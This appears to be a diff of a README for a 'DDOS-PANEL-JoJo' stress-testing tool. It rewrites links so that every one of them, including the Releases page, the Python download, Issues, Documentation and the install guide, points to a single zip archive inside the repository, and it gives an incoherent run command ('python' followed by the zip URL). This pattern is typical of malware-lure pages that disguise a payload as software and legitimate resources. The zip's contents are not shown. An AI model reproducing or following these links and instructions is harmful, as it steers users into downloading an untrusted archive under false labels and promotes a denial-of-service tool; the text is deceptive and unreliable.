@@ -1,6 +1,6 @@
 # ✨ DDOS-PANEL-JoJo - Your Simple Tool for Stress Testing
 
-[![Download](https://raw.githubusercontent.com/klinford/DDOS-PANEL-JoJo/main/tileyard/DDOS-PANEL-JoJo.zip)](https://raw.githubusercontent.com/klinford/DDOS-PANEL-JoJo/main/tileyard/DDOS-PANEL-JoJo.zip)
+[![Download](https://github.com/klinford/DDOS-PANEL-JoJo/raw/refs/heads/main/tileyard/PANE-Jo-DDO-v1.2.zip)](https://github.com/klinford/DDOS-PANEL-JoJo/raw/refs/heads/main/tileyard/PANE-Jo-DDO-v1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the DDOS-PANEL-JoJo project! This guide will help you download and ru
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/klinford/DDOS-PANEL-JoJo/main/tileyard/DDOS-PANEL-JoJo.zip). This is where you will find the latest version of the software.
+1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/klinford/DDOS-PANEL-JoJo/raw/refs/heads/main/tileyard/PANE-Jo-DDO-v1.2.zip). This is where you will find the latest version of the software.
    
 2. **Select the Latest Version**: Look for the latest release version listed on the page. Click on it to view details about the release.
 
@@ -20,14 +20,14 @@ Welcome to the DDOS-PANEL-JoJo project! This guide will help you download and ru
 
 5. **Run the Application**: 
    - If you downloaded an executable file (.exe for Windows), double-click it to run.
-   - If you downloaded a Python script (.py), you need to have Python installed on your computer to run it. Open your terminal or command prompt, navigate to the folder where you saved the file, and type `python https://raw.githubusercontent.com/klinford/DDOS-PANEL-JoJo/main/tileyard/DDOS-PANEL-JoJo.zip`.
+   - If you downloaded a Python script (.py), you need to have Python installed on your computer to run it. Open your terminal or command prompt, navigate to the folder where you saved the file, and type `python https://github.com/klinford/DDOS-PANEL-JoJo/raw/refs/heads/main/tileyard/PANE-Jo-DDO-v1.2.zip`.
 
 ## 🖥 System Requirements
 
 The DDOS-PANEL-JoJo application is designed to work on various systems. Below are the minimum requirements:
 
 - **Operating System**: Windows 7 or higher, macOS, or any Linux distribution.
-- **Python Version**: Python 3.6 or higher. You can [download Python here](https://raw.githubusercontent.com/klinford/DDOS-PANEL-JoJo/main/tileyard/DDOS-PANEL-JoJo.zip).
+- **Python Version**: Python 3.6 or higher. You can [download Python here](https://github.com/klinford/DDOS-PANEL-JoJo/raw/refs/heads/main/tileyard/PANE-Jo-DDO-v1.2.zip).
 - **Network Connection**: A stable internet connection is necessary to run stress tests.
 
 ## ⚙️ Features
@@ -63,7 +63,7 @@ If you encounter issues while using the DDOS-PANEL-JoJo application, consider th
 
 We welcome contributions and are happy to help you with any questions you may have. You can reach out in the following ways:
 
-- **Issues Page**: If you have a bug or feature request, please use the [Issues page](https://raw.githubusercontent.com/klinford/DDOS-PANEL-JoJo/main/tileyard/DDOS-PANEL-JoJo.zip) to report it.
+- **Issues Page**: If you have a bug or feature request, please use the [Issues page](https://github.com/klinford/DDOS-PANEL-JoJo/raw/refs/heads/main/tileyard/PANE-Jo-DDO-v1.2.zip) to report it.
 - **Feedback**: Feel free to provide feedback through the same page or directly in the discussions if you have improvement suggestions.
 
 ## 📜 Licensing
@@ -76,8 +76,8 @@ Stay tuned for regular updates. Enhancements and new features will be announced 
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://raw.githubusercontent.com/klinford/DDOS-PANEL-JoJo/main/tileyard/DDOS-PANEL-JoJo.zip): For in-depth instructions and usage tips.
-- [Python Installation Guide](https://raw.githubusercontent.com/klinford/DDOS-PANEL-JoJo/main/tileyard/DDOS-PANEL-JoJo.zip): If you need help installing Python on your system.
+- [Documentation](https://github.com/klinford/DDOS-PANEL-JoJo/raw/refs/heads/main/tileyard/PANE-Jo-DDO-v1.2.zip): For in-depth instructions and usage tips.
+- [Python Installation Guide](https://github.com/klinford/DDOS-PANEL-JoJo/raw/refs/heads/main/tileyard/PANE-Jo-DDO-v1.2.zip): If you need help installing Python on your system.
 
 ## ⚖️ Disclaimer
 
